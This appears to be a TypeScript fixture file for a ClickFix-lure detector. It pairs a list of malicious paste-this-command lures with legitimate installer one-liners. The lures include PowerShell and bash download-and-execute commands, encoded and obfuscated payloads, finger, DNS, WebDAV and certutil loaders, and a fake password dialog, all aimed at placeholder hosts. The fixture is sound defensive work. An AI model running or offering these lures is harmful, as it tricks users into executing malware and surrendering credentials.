// Commands modelled on public ClickFix reports, every address is a reserved test name or a TEST-NET IP.

function b64utf16(s: string): string {
  return Buffer.from(s, 'utf16le').toString('base64');
}
function b64(s: string): string {
  return Buffer.from(s, 'utf8').toString('base64');
}

export const LURES: Record<string, string> = {
  'powershell hidden with fake recaptcha id':
    'powershell -w h -c "iwr https://cdn.example.invalid/v.ps1 | iex" # ✅ I am not a robot - reCAPTCHA Verification ID: 4821',
  'mshta with cloudflare decoy': 'mshta https://verify.example.invalid/captcha.hta # I am not a robot - Cloudflare ID: 9a7f',
  'encoded command minimized': `cmd /c start /min powershell -nop -w hidden -enc ${b64utf16('iex (iwr http://192.0.2.10/a.ps1)')}`,
  'filefix padded path': `PowerShell -c "iwr https://files.example.invalid/x.ps1 | iex"${' '.repeat(60)}# C:\\company\\internal-secure\\filedrive\\HRPolicy.docx`,
  'macos base64 into bash': `echo "${b64('curl -fsSL http://192.0.2.10/install.sh | bash')}" | base64 -d | bash`,
  'finger into cmd': 'cmd /c start "" /min cmd /c "finger verify@192.0.2.20 | cmd"',
  'dns txt into iex': 'powershell -c "iex (Resolve-DnsName -Type TXT payload.example.invalid).Strings"',
  'nslookup into powershell': 'cmd /c nslookup -q=txt payload.example.invalid 192.0.2.53 | findstr "^Name:" | powershell -',
  'webdav rundll32': 'rundll32 \\\\cdn.example.invalid@ssl\\share\\x.dll,Start',
  'caret scrambled': 'c^m^d /c p^o^w^e^r^s^h^e^l^l -w h -c "i^e^x(i^w^r https://x.example.invalid/a)"',
  'string concatenation': `powershell -c "$a='Dow'+'nloadString';(New-Object Net.WebClient).$a('https://x.example.invalid/a.ps1')|iex"`,
  'conhost headless': 'conhost --headless powershell -c "irm https://x.example.invalid/a | iex"',
  'cmdkey then regsvr32': 'cmd /c cmdkey /add:192.0.2.40 /user:guest /pass:guest && regsvr32 /s \\\\192.0.2.40\\share\\a.dll',
  'cyrillic look-alike letter': 'pow\u0435rshell -w h -c "irm https://x.example.invalid | iex"',
  'osascript password prompt':
    "osascript -e 'set p to text returned of (display dialog \"Enter your password\" default answer \"\" with hidden answer)'",
  'msiexec from the internet': 'msiexec /q /i https://x.example.invalid/update.msi',
  'certutil download': 'certutil -urlcache -split -f http://192.0.2.10/a.exe %temp%\\a.exe && %temp%\\a.exe',
  'zero width characters': 'power\u200Bshell -w h -c "irm https://x.example.invalid/a | iex"',
  'quarantine strip on mac': 'curl -o /tmp/u https://x.example.invalid/u && xattr -c /tmp/u && chmod +x /tmp/u && /tmp/u',
};

export const BENIGN: Record<string, string> = {
  rustup: "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
  homebrew: '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
  'uv windows': 'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"',
  'uv unix': 'curl -LsSf https://astral.sh/uv/install.sh | sh',
  scoop: 'Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser; Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression',
  bun: 'powershell -c "irm bun.sh/install.ps1 | iex"',
  'install powershell': 'iex "& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI"',
  docker: 'curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh',
  nvm: 'curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash',
  winget: 'winget install --id Git.Git -e --source winget',
  npm: 'npm install --save-dev typescript',
  pip: 'python -m pip install requests',
  git: 'git clone https://github.com/xVoidByte/ClickFixWarden.git',
  docker_run: 'docker run -it --rm ubuntu:24.04 bash',
  kubectl: 'kubectl apply -f deployment.yaml',
  'execution policy': 'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
  dir: 'Get-ChildItem -Recurse -Filter *.log | Remove-Item',
  sfc: 'sfc /scannow',
  dism: 'DISM /Online /Cleanup-Image /RestoreHealth',
  flushdns: 'ipconfig /flushdns',
  'plain sentence': 'Thanks for verifying your email, you can close this window now.',
  'api call': 'curl https://api.example.com/v1/users -H "Authorization: Bearer abc123"',
  'ssh keygen': 'ssh-keygen -t ed25519 -C "you@example.com"',
  'scheduled task docs': 'schtasks /create /tn "Backup" /tr "C:\\Scripts\\backup.bat" /sc daily /st 02:00',
  'base64 data': 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
};
